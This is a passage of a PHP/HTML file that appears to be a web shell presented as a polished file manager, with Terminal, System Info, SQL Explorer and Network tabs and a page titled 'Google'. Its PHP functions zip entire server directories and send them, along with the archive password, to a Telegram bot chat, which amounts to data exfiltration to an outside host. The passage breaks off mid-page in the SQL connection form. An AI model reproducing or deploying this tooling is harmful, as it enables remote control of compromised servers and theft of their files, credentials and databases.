    // Add password info if provided
    if (!empty($password)) {
        $caption .= "\n🔑 Password: " . $password;
    }
    
    // Add compression info for ZIP files
    $ext = strtolower(pathinfo($filePath, PATHINFO_EXTENSION));
    if ($ext === 'zip') {
       
        if (!empty($password)) {
            $caption .= "\n🛡️ Encryption: AES-256";
        }
    }
    
    // Prepare the API endpoint
    $apiUrl = "https://api.telegram.org/bot{$botToken}/sendDocument";
    
    // Use cURL to send the request
    $curl = curl_init();
    $curlFile = new CURLFile($filePath, mime_content_type($filePath), basename($filePath));
    
    curl_setopt_array($curl, [
        CURLOPT_URL => $apiUrl,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => [
            'chat_id' => $chatId,
            'document' => $curlFile,
            'caption' => $caption,
            'parse_mode' => 'HTML'
        ]
    ]);
    
    $response = curl_exec($curl);
    $error = curl_error($curl);
    $httpCode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
    curl_close($curl);
    
    if ($error) {
        return ['error' => 'cURL Error: ' . $error];
    }
    
    $result = json_decode($response, true);
    
    if ($httpCode != 200 || !isset($result['ok']) || !$result['ok']) {
        return ['error' => 'Telegram API Error: ' . ($result['description'] ?? 'Unknown error')];
    }
    
    $successMessage = 'File sent to Telegram successfully';
    if (!empty($password)) {
        $successMessage .= " (Password: $password)";
    }
    
    return ['success' => $successMessage];
}
 
function sendDirectoryToTelegram($path, $password = '') {
    if (!is_dir($path)) {
        return ['error' => 'Not a directory: ' . $path];
    }
    
    // Create a temporary zip file
    $zipName = basename($path) . '_' . date('Ymd_His') . '.zip';
    $zipPath = sys_get_temp_dir() . '/' . $zipName;
    
    // Use provided password or generate one
    if (empty($password)) {
        $password = generateStrongPassword(20);
    }
    
    try {
        $zip = new ZipArchive();
        if ($zip->open($zipPath, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) {
            return ['error' => 'Failed to create ZIP archive'];
        }
        
        // Set password for the ZIP
        $zip->setPassword($password);
        
        // Add all files from the directory to the zip with maximum compression
        addFolderToZipSecure($path, $zip, '', $password);
        $zip->close();
        
        // Send the zip file to Telegram with the password
        $result = sendToTelegram($zipPath, $password);
        
        // Clean up the temporary file
        if (file_exists($zipPath)) {
            unlink($zipPath);
        }
        
        return $result;
    } catch (Exception $e) {
        if (file_exists($zipPath)) {
            unlink($zipPath);
        }
        return ['error' => 'Error zipping directory: ' . $e->getMessage()];
    }
}

 
function generateStrongPassword($length = 20) {
    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{}|;:,.<>?';
    $password = '';
    $charLength = strlen($chars) - 1;
    
    // Use a cryptographically secure random function
    for ($i = 0; $i < $length; $i++) {
        $password .= $chars[random_int(0, $charLength)];
    }
    
    return $password;
}

/**
 * Ensure a file is readable, attempting to fix permissions if needed
 * 
 * @param string $filePath Path to the file
 * @return array Status information with success/error details
 */
function ensureFileReadable($filePath) {
    if (!file_exists($filePath)) {
        return ['success' => false, 'error' => 'File not found'];
    }
    
    if (!is_file($filePath)) {
        return ['success' => false, 'error' => 'Not a file'];
    }
    
    // Check if already readable
    if (is_readable($filePath)) {
        return ['success' => true];
    }
    
    // Get current permissions
    $currentPerms = fileperms($filePath);
    $owner = function_exists('posix_getpwuid') ? posix_getpwuid(fileowner($filePath)) : ['name' => 'unknown'];
    $group = function_exists('posix_getgrgid') ? posix_getgrgid(filegroup($filePath)) : ['name' => 'unknown'];
    
    // Try to make readable
    $result = @chmod($filePath, 0644); // Try to set rw-r--r--
    
    if ($result) {
        return [
            'success' => true,
            'message' => 'Permissions fixed',
            'old_perms' => substr(sprintf('%o', $currentPerms), -4),
            'new_perms' => '0644'
        ];
    }
    
    // If we're here, chmod failed
    return [
        'success' => false,
        'error' => 'Cannot fix permissions',
        'perms' => substr(sprintf('%o', $currentPerms), -4),
        'owner' => $owner['name'],
        'group' => $group['name']
    ];
}

function addFolderToZipSecure($folder, $zip, $parentFolder = '', $password = '') {
    $folderName = $parentFolder . basename($folder) . '/';
    $zip->addEmptyDir($folderName);

    foreach (scandir($folder) as $item) {
        if ($item === '.' || $item === '..') {
            continue;
        }

        $path = $folder . DIRECTORY_SEPARATOR . $item;
        if (is_dir($path)) {
            // Recursively add subdirectories
            addFolderToZipSecure($path, $zip, $folderName, $password);
        } elseif (is_file($path)) {
            // Add file with encryption and maximum compression
            $localname = $folderName . basename($path);
            $zip->addFile($path, $localname);
            
            // Apply maximum compression level (9)
            $zip->setCompressionName($localname, ZipArchive::CM_DEFLATE, 9);
            
            // Apply encryption if password is provided
            if (!empty($password)) {
                $zip->setEncryptionName($localname, ZipArchive::EM_AES_256, $password);
            }
        }
    }
}

// Initial directory
$phpVars = [
    'csrf' => $_COOKIE['csrf_token'],
    'currentDir' => $cwd,
    'isEnc' => IsEnc,
    'encryptionKey' => ENCRYPTION_KEY,
    'terPWD' => $terminal->pwd(),
    // 'cmList' => (json_encode($terminal->commandsList()))
];


 

?>
<!DOCTYPE html>
<html lang="en" class="dark">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google <?php echo  $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']; ?></title>
    
    <!-- Critical CSS preloads -->
    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.css" as="style">
    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css" as="style">
    <!-- <link rel="preload" href="main.css" as="style"> -->
    <!-- JavaScript preloads -->
    <link rel="preload" href="https://cdn.tailwindcss.com" as="script">
    <link rel="preload" href="https://code.jquery.com/jquery-3.6.0.min.js" as="script">

    <!-- CSS Libraries -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.css"
        integrity="sha512-8BU3emz11z9iF75b10oPjjpamM4Mz23yQFQymbtwyPN3mNWHxpgeqyrYnkIUP6A8KyAj5k2p3MiYLtYqew7gIw=="
        crossorigin="anonymous" referrerpolicy="no-referrer" />
        
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css" />
     <!-- <link href="main.css" rel="stylesheet" /> -->
    <!-- Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    
    <!-- Core Libraries - Load after page structure is ready -->
    <script src="https://code.jquery.com/jquery-3.6.0.min.js" defer></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js" defer></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js" defer></script>
    
    <!-- UI Framework Scripts - Moved to after DOM loads -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/alpinejs/3.13.3/cdn.min.js" defer></script>
    <script src="https://cdn.jsdelivr.net/npm/sortablejs@1.15.0/Sortable.min.js" defer></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/sweetalert2/11.15.10/sweetalert2.all.js" defer></script>
    <!-- CodeMirror CDN links -->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/6.65.7/codemirror.min.css" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/6.65.7/theme/dracula.min.css" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/6.65.7/theme/eclipse.min.css" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/6.65.7/addon/dialog/dialog.min.css" />
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/6.65.7/codemirror.min.js"></script>
<!-- Modes -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/6.65.7/mode/javascript/javascript.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/6.65.7/mode/php/php.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/6.65.7/mode/clike/clike.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/6.65.7/mode/htmlmixed/htmlmixed.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/6.65.7/mode/xml/xml.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/6.65.7/mode/css/css.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/6.65.7/mode/sql/sql.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/6.65.7/mode/shell/shell.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/6.65.7/mode/markdown/markdown.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/6.65.7/mode/yaml/yaml.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/6.65.7/mode/python/python.min.js"></script>
<!-- Addons -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/6.65.7/addon/edit/matchbrackets.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/6.65.7/addon/edit/closetag.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/6.65.7/addon/edit/closebrackets.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/6.65.7/addon/comment/comment.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/6.65.7/addon/dialog/dialog.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/6.65.7/addon/search/search.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/6.65.7/addon/search/searchcursor.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/6.65.7/addon/fold/foldcode.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/6.65.7/addon/fold/foldgutter.min.js"></script>

<!-- Local scripts - Load at end -->  
 <!-- <script src="https://cdn.statically.io/gh/fx510/mian/master/5/utils-min.js" defer></script> 
<script src="https://cdn.statically.io/gh/fx510/mian/master/5/main-min.js" defer></script>
<script src="https://cdn.statically.io/gh/fx510/mian/master/5/sqlexplorer.js" defer></script> -->

<script src="utils.js" defer></script>
<script src="main.js" defer></script>
<script src="sqlexplorer.js" defer></script>  
<!-- Initialize CodeMirror editor -->
<script>
// Global variable for editor
let editor = null;
</script>
 
   <!-- Tailwind Configuration - Place before other scripts -->
    <script>
        tailwind.config = {
            darkMode: 'class',
            theme: {
                extend: {
                    animation: {
                        'fadeIn': 'fadeIn 0.3s ease-in-out',
                        'slideIn': 'slideIn 0.3s ease-in-out',
                        'pulse': 'pulse 1.5s cubic-bezier(0.4, 0, 0.6, 1) infinite'
                    },
                    keyframes: {
                        fadeIn: {
                            '0%': { opacity: '0' },
                            '100%': { opacity: '1' }
                        },
                        slideIn: {
                            '0%': { transform: 'translateY(10px)', opacity: '0' },
                            '100%': { transform: 'translateY(0)', opacity: '1' }
                        },
                        pulse: {
                            '0%, 100%': { opacity: '1' },
                            '50%': { opacity: '0.5' }
                        }
                    }
                }
            },
            plugins: [
                // Enable DaisyUI
                function({ addBase }) {
                    addBase({
                        '[data-theme="dark"]': { 'color-scheme': 'dark' }
                    })
                }
            ]
        }
    </script>

   <script type="text/javascript">
        const phpVars = <?php echo json_encode($phpVars); ?>;
        const fileManagerState = {
            currentPage: 1,
            totalPages: 1,
            isLoading: false,
            currentSort: { column: 'name', direction: 'asc' },
            files: [],
            clipboard: { action: "", path: [] },
            selectedFiles: [],
            tabs: [
                {
                    id: 'tab-1',
                    path: phpVars.currentDir,
                    active: true,
                    name: 'Home'
                }
            ],
            activeTabId: 'tab-1'
        };
        let isLoading = false;
    </script>
 <!-- Prevent FOUC with minimal inline style -->
 <style>
        html { visibility: hidden; }
        .no-fouc { visibility: visible; }
    </style>
    <style>
        /* Custom styles for the file manager */
        .animate-fadeIn {
            animation: fadeIn 0.3s ease-in-out;
        }
        
        .animate-tab-closing {
            animation: tabClosing 0.15s ease-in-out;
            transform: scale(0.9);
            opacity: 0.5;
        }
        
        .animate-ripple {
            animation: ripple 0.6s linear;
        }
        
        .animation-delay-300 {
            animation-delay: 0.3s;
        }
        
        .animation-delay-500 {
            animation-delay: 0.5s;
        }
        
        .animation-delay-800 {
            animation-delay: 0.8s;
        }
        
        /* Hide fileManagerUI properly when hidden class is applied */
        #fileManagerUI.hidden {
            display: none !important;
            visibility: hidden !important;
        }
        
        @keyframes fadeIn {
            from {
                opacity: 0;
            }
            to {
                opacity: 1;
            }
        }
        
        @keyframes tabClosing {
            from {
                transform: scale(1);
                opacity: 1;
            }
            to {
                transform: scale(0.9);
                opacity: 0.5;
            }
        }
        
        @keyframes ripple {
            0% {
                transform: scale(0);
                opacity: 0.5;
            }
            100% {
                transform: scale(4);
                opacity: 0;
            }
        }
        
        terminal {
            display: block;
            width: 100%;
            height: 100%;
            min-height: 400px;
            background: #000;
            color: #fff;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            line-height: 1.5;
            padding: 10px;
            overflow-y: auto;
            box-sizing: border-box;
        }
        
        terminal content {
            display: block;
            width: 100%;
        }
        
        terminal line {
            display: block;
            width: 100%;
            margin-bottom: 5px;
        }
        
        terminal path {
            color: #0f0;
            margin-right: 5px;
        }
        
        terminal cm {
            color: #0f0;
        }
        
        terminal code {
            color: #fff;
        }
        
        terminal bl {
            animation: blink 1s infinite;
            background: #fff;
            display: inline-block;
            width: 8px;
            height: 15px;
        }
        
        @keyframes blink {
            0% {
                opacity: 0;
            }
            50% {
                opacity: 1;
            }
            100% {
                opacity: 0;
            }
        }
        
        .dark .CodeMirror {
            border-color: #374151;
        }
        
        /* Custom scrollbar */
        ::-webkit-scrollbar {
            width: 8px;
            height: 8px;
        }
        
        ::-webkit-scrollbar-track {
            background: #f1f1f1;
            border-radius: 10px;
        }
        
        .dark ::-webkit-scrollbar-track {
            background: #1f2937;
        }
        
        ::-webkit-scrollbar-thumb {
            background: #888;
            border-radius: 10px;
        }
        
        ::-webkit-scrollbar-thumb:hover {
            background: #555;
        }
        
        .dark ::-webkit-scrollbar-thumb {
            background: #4b5563;
        }
        
        .dark ::-webkit-scrollbar-thumb:hover {
            background: #6b7280;
        }
        
        /* Disable animations if user prefers reduced motion */
        @media (prefers-reduced-motion) {
            .animate-fadeIn,
            .animate-tab-closing,
            .animate-ripple {
                animation: none !important;
            }
        }
        
        /* Disable animations if the body has the disable-animations class */
        body.disable-animations .animate-fadeIn,
        body.disable-animations .animate-tab-closing,
        body.disable-animations .animate-ripple {
            animation: none !important;
        }
        
        /* Custom file icon colors */
        .file-icon-php { color: #8892BF; }
        .file-icon-js { color: #F7DF1E; }
        .file-icon-css { color: #264DE4; }
        .file-icon-html { color: #E44D26; }
        .file-icon-json { color: #F69A1B; }
        .file-icon-md { color: #03A9F4; }
        .file-icon-img { color: #FF5722; }
        .file-icon-zip { color: #FFC107; }
        .file-icon-pdf { color: #F44336; }
        .file-icon-txt { color: #607D8B; }
        .file-icon-binary { color: #9C27B0; }
        .file-icon-folder { color: #4CAF50; }
        
        /* Tabs overflow handling */
        .tabs-container {
            position: relative;
            overflow: hidden;
        }
        
        .tabs-overflow {
            overflow-x: auto;
            scrollbar-width: none;
            -ms-overflow-style: none;
        }
        
        .tabs-overflow::-webkit-scrollbar {
            display: none;
        }
    </style>
</head>
<body class="bg-gray-100 dark:bg-gray-900 transition duration-300">
    <!-- Anti-FOUC script - Make the page visible when fully loaded -->
    <script>
        // Make the page visible when fully loaded
        window.addEventListener('load', function() {
            document.documentElement.classList.add('no-fouc');
            document.documentElement.style.visibility = 'visible';
        });
    </script>
    
    <!-- Theme toggle initialization script -->
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // Check for saved theme preference or use device theme
            const themeToggleBtn = document.getElementById('theme-toggle');
            const setTheme = (isDark) => {
                if (isDark) {
                    document.documentElement.classList.add('dark')
                    document.documentElement.setAttribute('data-theme', 'dark')
                } else {
                    document.documentElement.classList.remove('dark')
                    document.documentElement.setAttribute('data-theme', 'light')
                }
            }
            
            // Initial setting based on localStorage or system preference
            setTheme(localStorage.getItem('color-theme') === 'dark' || 
                (!localStorage.getItem('color-theme') && window.matchMedia('(prefers-color-scheme: dark)').matches))
            
            // Handle toggle click
            if (themeToggleBtn) {
                themeToggleBtn.addEventListener('click', function() {
                    const isDark = document.documentElement.classList.toggle('dark')
                    localStorage.setItem('color-theme', isDark ? 'dark' : 'light')
                    setTheme(isDark)
                })
            }
        })
    </script>
    
    <div id="app">
        <header class="sticky top-0 bg-white dark:bg-gray-800 border-b border-gray-200 dark:border-gray-700 shadow-sm px-4 py-2.5 sm:px-6 lg:px-8 z-50 backdrop-blur-sm bg-opacity-95 dark:bg-opacity-95">
            <div class="flex items-center justify-between flex-wrap">
                <!-- Logo and Home Link -->
                <div class="flex items-center">
                    <a href="javascript:void(0)" id="goHome" class="flex items-center space-x-2 text-gray-900 dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors cursor-pointer group relative" data-tooltip-target="tooltip-home">
                        <div class="bg-blue-600 text-white p-2 rounded-lg group-hover:bg-blue-700 transition-colors">
                            <i class="fas fa-home text-xl"></i>
                        </div>
                    </a>
                    <!-- Tooltip -->
                    <div id="tooltip-home" role="tooltip" class="absolute z-10 invisible inline-block px-3 py-2 text-sm font-medium text-white transition-opacity duration-300 bg-gray-900 rounded-lg shadow-sm opacity-0 tooltip dark:bg-gray-700">
                        Return to home directory
                        <div class="tooltip-arrow" data-popper-arrow></div>
                    </div>
                </div>
                                <!-- Navigation Tabs Container -->
                <div class="flex-1 ml-4">
                    <div class="inline-flex shadow-sm h-10 overflow-hidden bg-gray-100 dark:bg-gray-700 rounded-lg" role="tablist" id="default-tab" data-tabs-toggle="#default-tab-content">
                        <button id="file-tab" data-tabs-target="#file" type="button" role="tab" aria-controls="file" aria-selected="true"
                             class="px-4 py-2 flex items-center text-sm font-medium focus:z-10 focus:ring-2 focus:ring-blue-500 focus:outline-none">
                            <i class="fas fa-folder mr-2 text-blue-500"></i>
                            <span>Files</span>
                        </button>
                        <button id="upload-tab" data-tabs-target="#upload" type="button" role="tab" aria-controls="upload" aria-selected="false"
                             class="px-4 py-2 flex items-center text-sm font-medium focus:z-10 focus:ring-2 focus:ring-blue-500 focus:outline-none">
                            <i class="fas fa-cloud-upload-alt mr-2 text-green-500"></i>
                            <span>Upload</span>
                        </button>
                        <button id="terminal-tab" data-tabs-target="#terminal" type="button" role="tab" aria-controls="terminal" aria-selected="false"
                             class="px-4 py-2 flex items-center text-sm font-medium focus:z-10 focus:ring-2 focus:ring-blue-500 focus:outline-none">
                            <i class="fas fa-terminal mr-2 text-purple-500"></i>
                            <span>Terminal</span>
                        </button>
                        <button id="config-tab" data-tabs-target="#config" type="button" role="tab" aria-controls="config" aria-selected="false"
                            class="px-4 py-2 flex items-center text-sm font-medium focus:z-10 focus:ring-2 focus:ring-blue-500 focus:outline-none">
                            <i class="fas fa-server mr-2 text-teal-500"></i>
                            <span>System Info</span>
                        </button>
                        
                        <button id="sql-tab" data-tabs-target="#sql" type="button" role="tab" aria-controls="sql" aria-selected="false"
                            class="px-4 py-2 flex items-center text-sm font-medium focus:z-10 focus:ring-2 focus:ring-blue-500 focus:outline-none">
                            <i class="fas fa-database mr-2 text-orange-500"></i>
                            <span>SQL Explorer</span>
                        </button>
                        <button id="network-tab" data-tabs-target="#network" type="button" role="tab" aria-controls="network" aria-selected="false"
                            class="px-4 py-2 flex items-center text-sm font-medium focus:z-10 focus:ring-2 focus:ring-blue-500 focus:outline-none">
                            <i class="fas fa-network-wired mr-2 text-blue-500"></i>
                            <span>Network</span>
                        </button>
                        <button id="setting-tab" data-tabs-target="#setting" type="button" role="tab" aria-controls="setting" aria-selected="false"
                            class="px-4 py-2 flex items-center text-sm font-medium focus:z-10 focus:ring-2 focus:ring-blue-500 focus:outline-none">
                            <i class="fas fa-cog mr-2 text-gray-500"></i>
                            <span>Settings</span>
                        </button>
                    </div>
                </div>

                <!-- Right Side Controls -->
                <div class="flex items-center gap-3">
                    <!-- Search Bar -->
                    <div class="relative">
                        <div class="absolute inset-y-0 left-0 flex items-center pl-3 pointer-events-none">
                            <i class="fa fa-search text-gray-500 dark:text-gray-400"></i>
                        </div>
                        <input type="search" id="searchBar" class="block w-full p-2 pl-10 text-sm bg-gray-100 dark:bg-gray-700 border dark:border-gray-600 rounded-lg focus:ring-blue-500 focus:border-blue-500" placeholder="Search files...">
                        <button id="clearSearch" class="absolute inset-y-0 right-0 flex items-center pr-3 text-gray-500 dark:text-gray-400 hover:text-gray-700 dark:hover:text-gray-200" style="display: none;">
                            <i class="fas fa-times"></i>
                        </button>
                    </div>

                    <!-- Dark Mode Toggle -->
                    <button id="theme-toggle" type="button" class="flex items-center justify-center w-10 h-10 text-gray-500 bg-gray-100 rounded-lg dark:text-gray-400 dark:bg-gray-700 hover:bg-gray-200 dark:hover:bg-gray-600 focus:outline-none">
                        <i class="fas fa-moon dark:hidden"></i>
                        <i class="fas fa-sun hidden dark:inline-block"></i>
                        <span class="sr-only">Toggle dark mode</span>
                    </button>
                </div>
            </div>
        </header>
        <div x-data="{ 
                alertType: '', 
                alertMessage: '', 
                alertIsVisible: false,
                alertIcon: '',
                alertTitle: ''
            }" x-init="
                document.addEventListener('show-alert', event => {
                    const { type, message } = event.detail;
                    alertType = type;
                    alertMessage = message;
                    alertIsVisible = true;

                    switch(type) {
                        case 'info':
                            alertIcon = 'info-circle';
                            alertTitle = 'Information';
                            break;
                        case 'success':
                            alertIcon = 'check-circle';
                            alertTitle = 'Success';
                            break;
                        case 'warning':
                            alertIcon = 'exclamation-triangle';
                            alertTitle = 'Warning';
                            break;
                        case 'danger':
                            alertIcon = 'times-circle';
                            alertTitle = 'Danger';
                            break;
                    }

                    setTimeout(() => {
                        alertIsVisible = false;
                    }, 5000); // Auto-hide after 5 seconds
                });">
            <div x-show="alertIsVisible" :class="{
             'bg-blue-100 border-blue-300 text-blue-800': alertType === 'info',
             'bg-green-100 border-green-300 text-green-800': alertType === 'success',
             'bg-yellow-100 border-yellow-300 text-yellow-800': alertType === 'warning',
             'bg-red-100 border-red-300 text-red-800': alertType === 'danger'
         }" class="fixed top-4 left-1/2 transform -translate-x-1/2 w-full max-w-sm border rounded-md shadow-lg z-50 transition-transform duration-300"
                role="alert" x-transition:leave="transition ease-in duration-300"
                x-transition:leave-start="opacity-100 scale-100" x-transition:leave-end="opacity-0 scale-90">
                <div class="flex items-center p-4">
                    <div class="rounded-full p-2 mr-3" :class="{
                    'bg-blue-200 text-blue-600': alertType === 'info',
                    'bg-green-200 text-green-600': alertType === 'success',
                    'bg-yellow-200 text-yellow-600': alertType === 'warning',
                    'bg-red-200 text-red-600': alertType === 'danger'
                }">
                        <i :class="'fas fa-' + alertIcon"></i>
                    </div>
                    <!-- Content -->
                    <div class="flex-grow">
                        <h3 class="font-semibold" :class="{
                        'text-blue-800': alertType === 'info',
                        'text-green-800': alertType === 'success',
                        'text-yellow-800': alertType === 'warning',
                        'text-red-800': alertType === 'danger'
                    }" x-text="alertTitle"></h3>
                        <p class="text-sm" x-text="alertMessage"></p>
                    </div>
                    <!-- Close Button -->
                    <button @click="alertIsVisible = false" class="ml-3 text-gray-500 hover:text-gray-600">
                        <i class="fas fa-times"></i>
                    </button>
                </div>
            </div>
        </div>
        <div class="container mx-auto px-4 py-4 max-w-full">
            <!-- Location Tabs Bar -->
            <div class="mb-4 border-b border-gray-200 dark:border-gray-700">
                <div class="flex items-center">
                    <ul id="location-tabs" class="flex flex-nowrap overflow-x-auto scrollbar-thin scrollbar-thumb-gray-300 dark:scrollbar-thumb-gray-600 scrollbar-track-transparent text-sm font-medium text-center text-gray-500 dark:text-gray-400 relative">
                        <!-- Tabs will be dynamically inserted here -->
                    </ul>
                    <!-- Add New Tab Button -->
                    <button id="add-tab-btn" class="flex items-center justify-center p-2 ml-2 rounded-md bg-blue-50 text-blue-600 hover:bg-blue-100 dark:bg-blue-900/30 dark:text-blue-400 dark:hover:bg-blue-800/50 transition-all duration-200">
                        <i class="fas fa-plus mr-1"></i>
                        <span class="hidden sm:inline-block">New Tab</span>
                    </button>
                </div>
            </div>
 
            <nav id="breadcrumbs" class="flex w-full mb-6" aria-label="Breadcrumb">
                <div class="flex items-center bg-white dark:bg-gray-800 rounded-lg shadow-sm border border-gray-200 dark:border-gray-700 px-4 py-3 w-full">
                    <ol class="flex items-center flex-wrap flex-grow overflow-x-auto">
                        <li class="flex items-center">
                            <a href="#" class="breadcrumb-link flex items-center text-gray-700 hover:text-blue-600 dark:text-gray-300 dark:hover:text-white transition-all" data-path="/">
                                <span class="bg-blue-100 dark:bg-blue-900 text-blue-800 dark:text-blue-300 p-1.5 rounded-lg">
                                    <i class="fas fa-home"></i>
                                </span>
                                <span class="mx-2">/</span>
                        </a>
                    </li>
                        <!-- Additional breadcrumb items will be dynamically generated -->
                </ol>
                </div>
            </nav>


            <div id="default-tab-content">
                <!-- Tab content container - used for dynamic tabs -->
                <div id="tabs-content" class="w-full"></div>
                
               
                <div class="hidden p-4 rounded-lg bg-white dark:bg-gray-800" id="upload" role="tabpanel"
                    aria-labelledby="upload-tab">
                    <form id="uploadForm" class="space-y-6" enctype="multipart/form-data">
                        <div
                            class="flex flex-col items-center justify-center w-full h-64 border-2 border-gray-300 border-dashed rounded-lg cursor-pointer bg-gray-50 dark:hover:bg-gray-800 dark:bg-gray-700 hover:bg-gray-100 dark:border-gray-600 dark:hover:border-gray-500 transition-all duration-300">
                            <div id="dropZone" class="flex flex-col items-center justify-center pt-5 pb-6 w-full h-full">
                                <i class="fas fa-cloud-upload-alt text-5xl mb-4 text-blue-500 dark:text-blue-400 transition-transform duration-300 transform hover:scale-110"></i>
                                <p class="mb-2 text-sm text-gray-500 dark:text-gray-400">
                                    <span class="font-semibold">Click to upload</span> or drag and drop
                                </p>
                                <p class="text-xs text-gray-500 dark:text-gray-400">
                                    Any file type (MAX 100MB)
                                </p>
                                <div class="mt-4 flex items-center justify-center">
                                    <span class="bg-blue-100 text-blue-800 text-xs font-medium mr-2 px-2.5 py-0.5 rounded dark:bg-blue-900 dark:text-blue-300">
                                        <i class="fas fa-shield-alt mr-1"></i> Secure Upload
                                    </span>
                                    <span class="bg-green-100 text-green-800 text-xs font-medium px-2.5 py-0.5 rounded dark:bg-green-900 dark:text-green-300">
                                        <i class="fas fa-bolt mr-1"></i> Fast Processing
                                    </span>
                        </div>
                        </div>
                            <input id="fileInput" type="file" name="files[]" class="hidden" multiple />
                    </div>

                        <div id="uploadProgress" class="hidden w-full bg-gray-200 rounded-full h-2.5 dark:bg-gray-700">
                            <div id="progressBar"
                                class="bg-blue-600 h-2.5 rounded-full transition-all duration-300" style="width: 0%">
                            </div>
                            <p id="progressText" class="text-xs text-center mt-2 text-gray-500 dark:text-gray-400">
                                Uploading...
                            </p>
                </div>

                        <button type="submit"
                            class="w-full px-5 py-3 text-base font-medium text-center text-white bg-blue-700 rounded-lg hover:bg-blue-800 focus:ring-4 focus:ring-blue-300 dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800 transition-colors duration-300 flex items-center justify-center">
                            <i class="fas fa-upload mr-2"></i> Upload Files
                        </button>
                    </form>
                </div>
                </div> <!-- Close fileManagerUI div -->

<div class="hidden p-4 rounded-lg bg-white dark:bg-gray-800" id="terminal" role="tabpanel"
                    aria-labelledby="terminal-tab">
                    <terminal class="block relative w-full h-[calc(100vh-16rem)] bg-gray-800 rounded-lg overflow-hidden">
                        <header class="absolute w-full h-12 bg-gray-900 z-10 rounded-t-lg select-none">
                            </buttons>
                            <title
                                class="block absolute left-0 top-0 w-full h-full text-center text-white opacity-80 z-[-1] leading-[3rem]">
                                xterm &nbsp;

                            </title>
                        </header>
                        <content
                            class="absolute left-[1.5%] top-16 w-[98%] h-[calc(92%-1rem)] z-10 overflow-x-hidden overflow-y-auto text-gray-200 text-base">
                            <line class="current">
                            <path class="text-blue-400"><?php echo $terminal->pwd(); ?></path>
                            <sp class="text-red-400"></sp>
                                <t>
                                    <bl class="text-gray-400 relative top-[-2px]"></bl>
                                </t>
                            </line>
                        </content>
                    </terminal>
                </div>

                <!-- SQL Explorer Tab -->
                <div class="hidden p-4 rounded-lg bg-gray-100 dark:bg-gray-900" id="sql" role="tabpanel"
                    aria-labelledby="sql-tab">
                     
                        <!-- Loading Indicator -->
                        <div id="sqlLoadingIndicator" class="hidden fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
                            <div class="bg-white dark:bg-gray-800 p-6 rounded-lg shadow-lg flex flex-col items-center">
                                <div class="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600 mb-4"></div>
                                <p id="sqlLoadingMessage" class="text-gray-700 dark:text-gray-300">Loading...</p>
                            </div>
                        </div>
                        
                        <!-- Main layout with sidebar -->
                        <div class="flex flex-col lg:flex-row gap-6">
                            <!-- Sidebar -->
                            <div class="w-full lg:w-1/4">
                        <!-- Connection Form -->
                                <div id="sqlConnectionContainer" class="bg-white dark:bg-gray-800 rounded-lg shadow-sm border border-gray-200 dark:border-gray-700 mb-6 animate-fadeIn">
                                    <div class="bg-gradient-to-r from-blue-600 to-blue-700 text-white rounded-t-lg px-4 py-3 flex justify-between items-center">
                                        <h3 class="text-lg font-semibold flex items-center">
                                            <i class="fas fa-plug mr-2"></i> Connection
                            </h3>
                                        <!-- Logout button (now visible by default but will be positioned elsewhere) -->
